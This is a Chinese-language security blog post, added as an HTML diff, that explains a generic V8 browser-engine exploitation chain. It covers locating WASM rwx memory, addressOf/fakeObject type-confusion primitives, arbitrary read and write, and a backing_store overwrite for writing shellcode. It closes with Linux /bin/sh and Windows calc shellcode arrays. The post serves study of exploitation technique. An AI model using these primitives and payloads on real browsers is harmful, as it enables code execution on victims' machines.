@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            【V8】通用利用链研究
+        </div>
+        <div class="post-meta">
+            2024-07-25
+        </div>
+        <div class="post-md">
+            <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在v8利用上，我觉得也有一个明确的目标，就是执行任意<code>shellcode</code>。当有了这个目标后，下一步就是思考，怎么写<code>shellcode</code>呢？那么就需要有写内存相关的洞，能写到可读可写可执行的内存段，最好是能任意地址写。配套的还需要有任意读，因为需要知道rwx内存段的地址。就算没有任意读，也需要有办法能把改地址泄漏出来（V8的binary保护基本是全开的）。接下来就是需要能控制RIP，能让RIP跳转到<code>shellcode</code>的内存段</p>
+<h2 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h2><p>现如今的浏览器基本都支持WASM，v8会专门生成一段rwx内存供WASM使用，这就给了我们利用的机会。测试代码如下：</p>
+<pre><code class="javascript">%SystemBreak();
+var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);
+var f = wasmInstance.exports.main;
+%DebugPrint(f);
+%DebugPrint(wasmInstance);
+%SystemBreak();
+</code></pre>
+<p>然后使用gdb进行调试，在第一个断点的时候，使用<code>vmmap</code>来查看一下内存段，这个时候内存中是不存在可读可写可执行的内存断的，我们让程序继续运行。</p>
+<p>在第二个断点的时候，我们再运行一次<code>vmmap</code>来查看内存段：</p>
+<pre><code class="sh">pwndbg&gt; vmmap
+0x1b4249fd1000     0x1b4249fd2000 rwxp     1000      0 [anon_1b4249fd1]
+</code></pre>
+<p>因为WASM代码的创建，内存中出现可rwx的内存段。接下来的问题就是，我们怎么获取到这个地址呢？首先我们来看看变量<code>f</code>的信息：</p>
+<pre><code class="sh">DebugPrint: 0x19a4081d370d: [Function] in OldSpace
+ - map: 0x19a408204919 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x19a4081c3b4d &lt;JSFunction (sfi = 0x19a408144165)&gt;
+ - elements: 0x19a40800222d &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - function prototype: &lt;no-prototype-slot&gt;
+ - shared_info: 0x19a4081d36e9 &lt;SharedFunctionInfo js-to-wasm::i&gt;
+ - name: 0x19a4080051cd &lt;String[1]: #0&gt;
+ - builtin: GenericJSToWasmWrapper
+ - formal_parameter_count: 0
+ - kind: NormalFunction
+ - context: 0x19a4081c3649 &lt;NativeContext[252]&gt;
+ - code: 0x19a40018d801 &lt;Code BUILTIN GenericJSToWasmWrapper&gt;
+ - Wasm instance: 0x19a4081d35b9 &lt;Instance map = 0x19a408207399&gt;
+ - Wasm function index: 0
+ - properties: 0x19a40800222d &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): &#123;
+    0x19a4080048f1: [String] in ReadOnlySpace: #length: 0x19a408142339 &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor
+    0x19a408004a21: [String] in ReadOnlySpace: #name: 0x19a4081422f5 &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor
+    0x19a408004029: [String] in ReadOnlySpace: #arguments: 0x19a40814226d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor
+    0x19a408004245: [String] in ReadOnlySpace: #caller: 0x19a4081422b1 &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor
+ &#125;
+ - feedback vector: feedback metadata is not available in SFI
+0x19a408204919: [Map]
+ - type: JS_FUNCTION_TYPE
+ - instance size: 28
+ - inobject properties: 0
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - stable_map
+ - callable
+ - back pointer: 0x19a4080023b5 &lt;undefined&gt;
+ - prototype_validity cell: 0x19a408142405 &lt;Cell value= 1&gt;
+ - instance descriptors (own) #4: 0x19a4081d0445 &lt;DescriptorArray[4]&gt;
+ - prototype: 0x19a4081c3b4d &lt;JSFunction (sfi = 0x19a408144165)&gt;
+ - constructor: 0x19a408002235 &lt;null&gt;
+ - dependent code: 0x19a4080021b9 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
+ - construction counter: 0
+</code></pre>
+<p>可以发现这是一个函数对象，我们来查看一下<code>f</code>的<code>shared_info</code>结构的信息：</p>
+<pre><code class="sh">pwndbg&gt; job 0x19a4081d36e9
+0x19a4081d36e9: [SharedFunctionInfo] in OldSpace
+ - map: 0x19a4080025f9 &lt;Map[36]&gt;
+ - name: 0x19a4080051cd &lt;String[1]: #0&gt;
+ - kind: NormalFunction
+ - syntax kind: AnonymousExpression
+ - function_map_index: 179
+ - formal_parameter_count: 0
+ - expected_nof_properties: 
+ - language_mode: sloppy
+ - data: 0x19a4081d36bd &lt;Other heap object (WASM_EXPORTED_FUNCTION_DATA_TYPE)&gt;
+ - code (from data): 0x19a40018d801 &lt;Code BUILTIN GenericJSToWasmWrapper&gt;
+ - script: 0x19a4081d3541 &lt;Script&gt;
+ - function token position: 88
+ - start position: 88
+ - end position: 92
+ - no debug info
+ - scope info: 0x19a408002739 &lt;ScopeInfo&gt;
+ - length: 0
+ - feedback_metadata: &lt;none&gt;
+</code></pre>
+<p>接下里再查看其<code>data</code>结构：</p>
+<pre><code class="sh">pwndbg&gt; job 0x19a4081d36bd
+0x19a4081d36bd: [WasmExportedFunctionData] in OldSpace
+ - map: 0x19a408002e7d &lt;Map[44]&gt;
+ - target: 0x1b4249fd1000
+ - ref: 0x19a4081d35b9 &lt;Instance map = 0x19a408207399&gt;
+ - wrapper_code: 0x19a40018d801 &lt;Code BUILTIN GenericJSToWasmWrapper&gt;
+ - instance: 0x19a4081d35b9 &lt;Instance map = 0x19a408207399&gt;
+ - function_index: 0
+ - signature: 0x19a408049e81 &lt;Foreign&gt;
+ - wrapper_budget: 1000
+</code></pre>
+<p>再查看<code>instance</code>结构：</p>
+<pre><code class="sh">pwndbg&gt; job 0x19a4081d35b9
+0x19a4081d35b9: [WasmInstanceObject] in OldSpace
+ - map: 0x19a408207399 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x19a408048069 &lt;Object map = 0x19a408207af1&gt;
+ - elements: 0x19a40800222d &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - module_object: 0x19a408049c95 &lt;Module map = 0x19a408207231&gt;
+ - exports_object: 0x19a408049e49 &lt;Object map = 0x19a408207bb9&gt;
+ - native_context: 0x19a4081c3649 &lt;NativeContext[252]&gt;
+ - memory_object: 0x19a4081d35a1 &lt;Memory map = 0x19a408207641&gt;
+ - table 0: 0x19a408049e19 &lt;Table map = 0x19a4082074b1&gt;
+ - imported_function_refs: 0x19a40800222d &lt;FixedArray[0]&gt;
+ - indirect_function_table_refs: 0x19a40800222d &lt;FixedArray[0]&gt;
+ - managed_native_allocations: 0x19a408049dd1 &lt;Foreign&gt;
+ - memory_start: 0x7f70c0000000
+ - memory_size: 65536
+ - imported_function_targets: 0x55b2e0e37d40
+ - globals_start: (nil)
+ - imported_mutable_globals: 0x55b2e0e37dc0
+ - indirect_function_table_size: 0
+ - indirect_function_table_sig_ids: (nil)
+ - indirect_function_table_targets: (nil)
+ - properties: 0x19a40800222d &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): &#123;&#125;
+</code></pre>
+<p>仔细查看能发现，<code>instance</code>结构就是js代码中的<code>wasmInstance</code>变量的地址，在代码中我们加入了<code>%DebugPrint(wasmInstance);</code>，所以也会输出该结构的信息，可以去对照看看。</p>
+<p>我们再来查看这个结构的内存布局：</p>
+<p><img src="/img/article/v8-2/image-20240724144804011.png" alt="image-20240724144804011"></p>
+<p>仔细看，能发现，rwx段的起始地址储存在<code>instance+0x60</code>的位置，不过这个不用记，不同版本，这个偏移值可能会有差距，可以在写exp的时候通过上述调试的方式进行查找。</p>
+<p>根据WASM的特性，我们的目的可以更细化了，现在我们的目的变为了把<code>shellcode</code>写到WASM的代码段，然后执行WASM函数，那么就能执行<code>shellcode</code>了。</p>
+<h2 id="数据存储结构"><a href="#数据存储结构" class="headerlink" title="数据存储结构"></a>数据存储结构</h2><p>首先来看看JavaScript的两种类型的变量的结构：</p>
+<pre><code class="javascript">a = [2.1];
+b = &#123;&quot;a&quot;: 1&#125;;
+c = [b];
+%DebugPrint(a);
+%DebugPrint(b);
+%DebugPrint(c);
+%SystemBreak();
+</code></pre>
+<p>对照变量a的job结果和内存内容如图，我们可以推断出a的数据存储结构</p>
+<p><img src="/img/article/v8-2/image-20240724150943906.png" alt="image-20240724150943906"></p>
+<pre><code class="sh">| 32 bit map addr | 32 bit properties addr | 32 bit elements addr | 32 bit length|
+</code></pre>
+<p>可以注意到只存储了低32位的地址，这是因为在当前版本的v8中，对地址进行了压缩，因为高32bit地址的值是一样的。</p>
+<p>同理分析<code>elements</code>的结构，可以得到大致</p>
+<p><img src="/img/article/v8-2/image-20240724151241342.png" alt="image-20240724151241342"></p>
+<pre><code class="sh">| 32 bit map addr | 32 bit length | value ......
+</code></pre>
+<p>接下来看看变量b和c</p>
+<pre><code class="sh">DebugPrint: 0x1f8608049991: [JS_OBJECT_TYPE]
+ - map: 0x1f8608207aa1 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x1f86081c41f5 &lt;Object map = 0x1f86082021b9&gt;
+ - elements: 0x1f860800222d &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - properties: 0x1f860800222d &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): &#123;
+    0x1f8608007b15: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
+ &#125;
+0x1f8608207aa1: [Map]
+ - type: JS_OBJECT_TYPE
+ - instance size: 16
+ - inobject properties: 1
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0x1f8608207a79 &lt;Map(HOLEY_ELEMENTS)&gt;
+ - prototype_validity cell: 0x1f8608142405 &lt;Cell value= 1&gt;
+ - instance descriptors (own) #1: 0x1f86080499a1 &lt;DescriptorArray[1]&gt;
+ - prototype: 0x1f86081c41f5 &lt;Object map = 0x1f86082021b9&gt;
+ - constructor: 0x1f86081c3e2d &lt;JSFunction Object (sfi = 0x1f860814474d)&gt;
+ - dependent code: 0x1f86080021b9 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
+ - construction counter: 0
+
+DebugPrint: 0x1f86080499c9: [JSArray]
+ - map: 0x1f8608203b31 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x1f86081cc0e9 &lt;JSArray[0]&gt;
+ - elements: 0x1f86080499bd &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]
+ - length: 1
+ - properties: 0x1f860800222d &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): &#123;
+    0x1f86080048f1: [String] in ReadOnlySpace: #length: 0x1f860814215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor
+ &#125;
+ - elements: 0x1f86080499bd &lt;FixedArray[1]&gt; &#123;
+           0: 0x1f8608049991 &lt;Object map = 0x1f8608207aa1&gt;
+ &#125;
+0x1f8608203b31: [Map]
+ - type: JS_ARRAY_TYPE
+ - instance size: 16
+ - inobject properties: 0
+ - elements kind: PACKED_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - back pointer: 0x1f8608203b09 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;
+ - prototype_validity cell: 0x1f8608142405 &lt;Cell value= 1&gt;
+ - instance descriptors #1: 0x1f86081cc59d &lt;DescriptorArray[1]&gt;
+ - transitions #1: 0x1f86081cc619 &lt;TransitionArray[4]&gt;Transition array #1:
+     0x1f860800524d &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_ELEMENTS) -&gt; 0x1f8608203b59 &lt;Map(HOLEY_ELEMENTS)&gt;
+
+ - prototype: 0x1f86081cc0e9 &lt;JSArray[0]&gt;
+ - constructor: 0x1f86081cbe85 &lt;JSFunction Array (sfi = 0x1f860814adc9)&gt;
+ - dependent code: 0x1f86080021b9 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
+ - construction counter: 0
+</code></pre>
+<p>注意到 map 结构体中存在一项成员用以标注 elements 类型：</p>
+<pre><code class="sh"> - elements kind: PACKED_ELEMENTS
+</code></pre>
+<p>因此可以直接将一个变量的 map 地址赋给另外一个变量，使得在读取值时错误解析数据类型，也就是所谓的“类型混淆”。类型混淆是有可能造成地址泄露的，可以考虑这样的代码：</p>
+<pre><code class="javsscript">float_arr= [2.1];
+obj_arr=[float_arr];
+%DebugPrint(a);
+%DebugPrint(b);
+%SystemBreak();
+</code></pre>
+<p>正常访问<code>obj_arr[0]</code>会得到一个对象，但如果修改<code>obj_arr</code>的<code>map</code>为<code>float_arr</code>的<code>map</code>，就会认为<code>obj_arr</code>是一个浮点数数组，那么此时访问<code>obj_arr[0]</code>就会得到对象<code>float_arr</code>的地址了</p>
+<h2 id="数据读取"><a href="#数据读取" class="headerlink" title="数据读取"></a>数据读取</h2><h3 id="addressOf"><a href="#addressOf" class="headerlink" title="addressOf"></a>addressOf</h3><p>同上所述，我们将这种类型混淆的读取地址方法称之为<strong>addressOf</strong>，一般写法如下：</p>
+<pre><code class="javascript">//获取某个变量的地址
+var other=&#123;&quot;a&quot;:1&#125;;
+var obj_array=[other];
+var double_array=[2.1];
+var double_array_map=double_array.getMap();//假设我们有办法获取到其 map 值
+function addressOf(target_var)
+&#123;
+    obj_array[0]=target_var;
+    obj_array.setMap(double_array_map);//设置其 map 为浮点数数组的 map
+    let target_var_addr=float_to_int(obj_array[0]);//读取obj_array[0]并将该浮点数转换为整型
+    return target_var_addr;//此处返回的是 target_var 的对象结构体地址
+&#125;
+</code></pre>
+<h3 id="fakeObject"><a href="#fakeObject" class="headerlink" title="fakeObject"></a>fakeObject</h3><p>与 <code>addressOf</code> 的步骤相反，将 <code>float_arr</code> 的 <code>map</code> 改为 <code>obj_arr 的 map</code>，使得在访问 <code>float_arr[0]</code> 时得到一个以 <code>float_arr[0]</code> 地址为起始的对象</p>
+<pre><code class="javascript">//将某个地址转换为对象
+var other=&#123;&quot;a&quot;:1&#125;;
+var obj_array=[other];
+var double_array=[2.1];
+var obj_array_map=obj_array.getMap();//假设我们有办法获取到其 map 值
+function fakeObject(target_addr)
+&#123;
+    double_array[0]=int_to_float(target_addr+1n);//将地址加一以区分对象和数值
+    double_array.setMap(obj_array_map);
+    let fake_obj=double_array[0];
+    return fake_obj;
+&#125;
+</code></pre>
+<h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><p>可以尝试构造出这样一个结构：</p>
+<pre><code class="js">var fake_array=[double_array_map,int_to_float(0x4141414141414141n)];
+</code></pre>
+<p>其在内存中的布局应为：</p>
+<pre><code class="sh">| 32bit elements map | 32bit length | 64bit double_array_map | 64bit 0x4141414141414141 |element
+| 32bit fake_array map | 32bit properties | 32bit elements | 32bit length |JSArray
+</code></pre>
+<p>接下来通过 addressOf 获取 fake_array 的地址，然后就能够计算出 double_array_map 的地址；再通过 fakeObject 将这个地址伪造成一个对象数组，对比下面的内存布局：</p>
+<pre><code class="sh">| 32bit map addr | 32bit properties addr | 32bit elements addr | 32bit length |JSArray
+</code></pre>
+<p>此处的 fake_array[0] 成为了 JSArray 的 map 和 properties ，fake_array[1] 被当作了 elements addr 和 length，通过修改 fake_array[1] 就能够使该 elements 指向任意地址，再访问 fakeObject[0] 即可读取该地址处的数据了(此处 double_array_map 需要对应为一个 double 数组的 map)</p>
+<p>代码逻辑大致如下：</p>
+<pre><code class="js">var fake_array=[double_array_map,int_to_float(0x4141414141414141n)];4
+
+function read64_addr(addr)
+&#123;
+    var fake_array_addr=addressOf(fake_array);
+    var fake_object_addr=fake_array_addr-0x10n;
+    var fake_object=fakeObject(fake_object_addr);
+    fake_array[1]=int_to_float(addr-8n+1n);
+    return fake_object[0];
+    
+&#125; 
+</code></pre>
+<h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>同上一小节一样，只需要将最后的 return 修改为写入即可：</p>
+<pre><code class="js">var fake_array=[double_array_map,int_to_float(0x4141414141414141n)];4
+
+function write64_addr(addr,data)
+&#123;
+    var fake_array_addr=addressOf(fake_array);
+    var fake_object_addr=fake_array_addr-0x10n;
+    var fake_object=fakeObject(fake_object_addr);
+    fake_array[1]=int_to_float(addr-8n+1n);
+    fake_object[0]=data;
+&#125; 
+</code></pre>
+<h2 id="shellcode写入"><a href="#shellcode写入" class="headerlink" title="shellcode写入"></a>shellcode写入</h2><blockquote>
+<p>设置的 elements 地址为 addr-8n+1n，我们想要写 shellcode 的地址一般都是内存段在开头，那么更前面的内存空间则是未开辟的，写入时会因为访问未开辟的内存空间发生异常。因此直接性的写入不太能够成功，但间接性的方法或许还是存在的，如果向某个对象中写入数据不需要经过 map 和 length，或许就能够顺利完成了。</p>
+</blockquote>
+<p>见如下代码</p>
+<pre><code class="js">var data_buf = new ArrayBuffer(0x10);
+var data_view = new DataView(data_buf);
+data_view.setFloat64(0, 2.0, true);
+%DebugPrint(data_buf);
+%DebugPrint(data_view);
+%SystemBreak();
+</code></pre>
+<p>输出</p>
+<pre><code class="sh">DebugPrint: 0x16eb080499b9: [JSArrayBuffer]
+ - map: 0x16eb08203271 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x16eb081ca361 &lt;Object map = 0x16eb08203299&gt;
+ - elements: 0x16eb0800222d &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - embedder fields: 2
+ - backing_store: 0x559afc82d780
+ - byte_length: 16
+ - max_byte_length: 16
+ - detachable
+ - properties: 0x16eb0800222d &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): &#123;&#125;
+ - embedder fields = &#123;
+    0, aligned pointer: (nil)
+    0, aligned pointer: (nil)
+ &#125;
+0x16eb08203271: [Map]
+ - type: JS_ARRAY_BUFFER_TYPE
+ - instance size: 64
+ - inobject properties: 0
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0x16eb080023b5 &lt;undefined&gt;
+ - prototype_validity cell: 0x16eb08142405 &lt;Cell value= 1&gt;
+ - instance descriptors (own) #0: 0x16eb080021c1 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;
+ - prototype: 0x16eb081ca361 &lt;Object map = 0x16eb08203299&gt;
+ - constructor: 0x16eb081ca28d &lt;JSFunction ArrayBuffer (sfi = 0x16eb08149bed)&gt;
+ - dependent code: 0x16eb080021b9 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
+ - construction counter: 0
+
+DebugPrint: 0x16eb080499f9: [JSDataView]
+ - map: 0x16eb08202ca9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x16eb081c8665 &lt;Object map = 0x16eb08202cd1&gt;
+ - elements: 0x16eb0800222d &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - embedder fields: 2
+ - buffer =0x16eb080499b9 &lt;ArrayBuffer map = 0x16eb08203271&gt;
+ - byte_offset: 0
+ - byte_length: 16
+ - properties: 0x16eb0800222d &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): &#123;&#125;
+ - embedder fields = &#123;
+    0, aligned pointer: (nil)
+    0, aligned pointer: (nil)
+ &#125;
+0x16eb08202ca9: [Map]
+ - type: JS_DATA_VIEW_TYPE
+ - instance size: 56
+ - inobject properties: 0
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0x16eb080023b5 &lt;undefined&gt;
+ - prototype_validity cell: 0x16eb08142405 &lt;Cell value= 1&gt;
+ - instance descriptors (own) #0: 0x16eb080021c1 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;
+ - prototype: 0x16eb081c8665 &lt;Object map = 0x16eb08202cd1&gt;
+ - constructor: 0x16eb081c8461 &lt;JSFunction DataView (sfi = 0x16eb081482c9)&gt;
+ - dependent code: 0x16eb080021b9 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
+ - construction counter: 0
+</code></pre>
+<p>可以注意到<code>JSDataView</code>的<code>buffer</code>指向了<code>JSArrayBuffer</code>，而<code>JSArrayBuffer</code>的 <code>backing_store</code>则指向了实际的数据储存地址，那么如果我们能够写<code>backing_store</code>为 <code>shellcode</code>内存段，就可以通过<code>JSDataView</code>的<code>setFloat64</code>方法直接写入了</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>shellcode</p>
+<pre><code class="js">//Linux x64
+var shellcode = [  
+  0x2fbb485299583b6an,  
+  0x5368732f6e69622fn,  
+  0x050f5e5457525f54n  
+];  
+
+//Windows 计算器
+var shellcode = [  
+    0xc0e8f0e48348fcn,  
+    0x5152504151410000n,  
+    0x528b4865d2314856n,  
+    0x528b4818528b4860n,  
+    0xb70f4850728b4820n,  
+    0xc03148c9314d4a4an,  
+    0x41202c027c613cacn,  
+    0xede2c101410dc9c1n,  
+    0x8b20528b48514152n,  
+    0x88808bd001483c42n,  
+    0x6774c08548000000n,  
+    0x4418488b50d00148n,  
+    0x56e3d0014920408bn,  
+    0x4888348b41c9ff48n,  
+    0xc03148c9314dd601n,  
+    0xc101410dc9c141acn,  
+    0x244c034cf175e038n,  
+    0x4458d875d1394508n,  
+    0x4166d0014924408bn,  
+    0x491c408b44480c8bn,  
+    0x14888048b41d001n,  
+    0x5a595e58415841d0n,  
+    0x83485a4159415841n,  
+    0x4158e0ff524120ecn,  
+    0xff57e9128b485a59n,  
+    0x1ba485dffffn,  
+    0x8d8d480000000000n,  
+    0x8b31ba4100000101n,  
+    0xa2b5f0bbd5ff876fn,  
+    0xff9dbd95a6ba4156n,  
+    0x7c063c28c48348d5n,  
+    0x47bb0575e0fb800an,  
+    0x894159006a6f7213n,  
+    0x2e636c6163d5ffdan,  
+    0x657865n,  
+];
+</code></pre>
+<p>其他函数</p>
+<pre><code class="js">  
+function float_to_int(f)  
+&#123;  
+  f64[0] = f;  
+    return bigUint64[0];  
+&#125;  
+  
+function int_to_float(i)  
+&#123;  
+    bigUint64[0] = i;  
+    return f64[0];  
+&#125;  
+</code></pre>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    <!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="Loora1N";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/about/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body>
+</html>
